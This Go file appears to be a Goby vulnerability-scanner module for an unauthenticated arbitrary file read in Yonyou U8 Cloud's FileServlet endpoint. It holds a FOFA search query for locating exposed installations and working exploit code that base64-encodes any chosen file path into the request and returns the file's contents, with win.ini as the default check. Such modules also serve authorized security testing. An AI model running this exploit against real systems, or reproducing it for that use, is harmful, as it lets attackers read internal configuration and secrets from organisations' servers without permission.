package exploits

import (
	"encoding/base64"
	"errors"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "yonyou-U8-Cloud /service/~hrpub/nc.bs.hr.tools.trans.FileServlet File Read Vulnerability",
    "Description": "<p>Yonyou U8 Cloud is a new generation of cloud ERP launched by Yonyou, which mainly focuses on growing and innovative enterprises and provides enterprise-level cloud ERP overall solutions.  </p><p>There is an arbitrary file reading vulnerability in the interface of Yonyou U8 Cloud /service/~hrpub/nc.bs.hr.tools.trans.FileServlet, through which an unauthenticated remote attacker can obtain the internal configuration file of the system, so that the system is in an extremely insecure state.</p>",
    "Product": "yonyou-U8-Cloud",
    "Homepage": "https://www.yonyou.com/",
    "DisclosureDate": "2024-03-31",
    "PostTime": "2024-11-20",
    "Author": "202205566302@smail.xtu.edu.cn",
    "FofaQuery": "title=\"U8C\" && body=\"U8 cloud\"",
    "GobyQuery": "title=\"U8C\" && body=\"U8 cloud\"",
    "Level": "1",
    "Impact": "<p>There is an arbitrary file reading vulnerability in the interface of Yonyou U8 Cloud /service/~hrpub/nc.bs.hr.tools.trans.FileServlet, through which an unauthenticated remote attacker can obtain the internal configuration file of the system, so that the system is in an extremely insecure state.</p>",
    "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls. </p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://axsec.blog.csdn.net/article/details/137211785"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "win.ini,Customize",
            "show": ""
        },
        {
            "name": "Customize",
            "type": "input",
            "value": "C://windows/win.ini",
            "show": "mode=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.0",
    "Translation": {
        "CN": {
            "Name": "用友U8 Cloud /service/~hrpub/nc.bs.hr.tools.trans.FileServlet 文件读取漏洞",
            "Product": "用友-U8-Cloud",
            "Description": "<p>用友U8 Cloud是用友推出的新一代云ERP，主要聚焦成长型、创新型企业，提供企业级云ERP整体解决方案。&nbsp;</p><p>用友U8 Cloud /service/~hrpub/nc.bs.hr.tools.trans.FileServlet接口处存在任意文件读取漏洞，未经身份验证的远程攻击者通过漏洞可以获取系统内部配置文件，使系统处于极不安全的状态。<br></p>",
            "Recommendation": "<p>1、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>2 、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>用友U8 Cloud&nbsp;/service/~hrpub/nc.bs.hr.tools.trans.FileServlet接口处存在任意文件读取漏洞，未经身份验证的远程攻击者通过漏洞可以获取系统内部配置文件，使系统处于极不安全的状态。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "yonyou-U8-Cloud /service/~hrpub/nc.bs.hr.tools.trans.FileServlet File Read Vulnerability",
            "Product": "yonyou-U8-Cloud",
            "Description": "<p>Yonyou U8 Cloud is a new generation of cloud ERP launched by Yonyou, which mainly focuses on growing and innovative enterprises and provides enterprise-level cloud ERP overall solutions.&nbsp;&nbsp;</p><p>There is an arbitrary file reading vulnerability in the interface of Yonyou U8 Cloud /service/~hrpub/nc.bs.hr.tools.trans.FileServlet, through which an unauthenticated remote attacker can obtain the internal configuration file of the system, so that the system is in an extremely insecure state.<br></p>",
            "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls.&nbsp;</p><p>2. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>There is an arbitrary file reading vulnerability in the interface of Yonyou U8 Cloud /service/~hrpub/nc.bs.hr.tools.trans.FileServlet, through which an unauthenticated remote attacker can obtain the internal configuration file of the system, so that the system is in an extremely insecure state.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9973"
}`

	postOrGet_asfhkjasfhgatksfhayusgfhyashufyuiasufhasfgyihuasjfia := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {
		respTxt := ""
		requestConfig := httpclient.NewGetRequestConfig("/service/~hrpub/nc.bs.hr.tools.trans.FileServlet?path=" + base64.StdEncoding.EncodeToString([]byte(fileUrl)))
		requestConfig.VerifyTls = false
		requestConfig.FollowRedirect = false
		resp, err := httpclient.DoHttpRequest(hostInfo, requestConfig)
		if err != nil || resp.StatusCode != 200 {
			err = errors.New("failed to read file")
			return "", err
		}
		respTxt = resp.RawBody
		// 注意：返回值为（最终要返回的读取结果，错误）
		return respTxt, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := "/service/~hrpub/nc.bs.hr.tools.trans.FileServlet"
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"C://windows/win.ini": "[extensions]",
			}
			// 函数继承
			uploadFileFunc := postOrGet_asfhkjasfhgatksfhayusgfhyashufyuiasufhasfgyihuasjfia

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			for fileUrl, fileText := range defaultModeMap {
				resp, err := uploadFileFunc(u, fileUrl)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = u.HostInfo + vulURL
					return true
				}
			}
			return false
		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])

			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				"win.ini": {"C://windows/win.ini", "[extensions]"},
			}
			// 此处需要修改：函数继承
			uploadFileFunc := postOrGet_asfhkjasfhgatksfhayusgfhyashufyuiasufhasfgyihuasjfia

			// 请注意，后续代码为模板固化，正常情况下均无需修改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			if mode == "Customize" {
				fileUrl = goutils.B2S(ss.Params["Customize"])
			} else {
				if _, ok := defaultModeMap[mode]; ok {
					fileUrl = defaultModeMap[mode][0]
					fileText = defaultModeMap[mode][1]
				} else {
					expResult.Success = false
					return expResult
				}
			}

			// 获取返回结果url和返回请求头
			resp, err := uploadFileFunc(expResult.HostInfo, fileUrl)
			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {
				expResult.Success = false
				return expResult
			}

			expResult.Success = true
			expResult.Output = resp
			return expResult
		},
	))
}
